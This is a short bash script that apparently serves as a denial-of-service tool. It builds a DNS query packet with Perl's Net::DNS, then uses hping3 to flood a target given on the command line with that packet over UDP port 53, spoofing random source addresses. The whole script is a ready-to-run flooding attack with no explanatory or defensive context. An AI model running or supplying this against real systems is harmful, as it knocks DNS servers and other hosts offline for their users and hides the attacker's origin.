#!/bin/bash

perl -MNet::DNS::Packet -e 'print Net::DNS::Packet->new(shift)->data' "mydomain.com" > /tmp/.dns.packet

DNS_PACKET_LENGTH=$(ls -l /tmp/.dns.packet |awk '{print $5}')

hping3 -2 -p 53 --flood -E /tmp/.dns.packet -d $DNS_PACKET_LENGTH -q $1 --rand-source
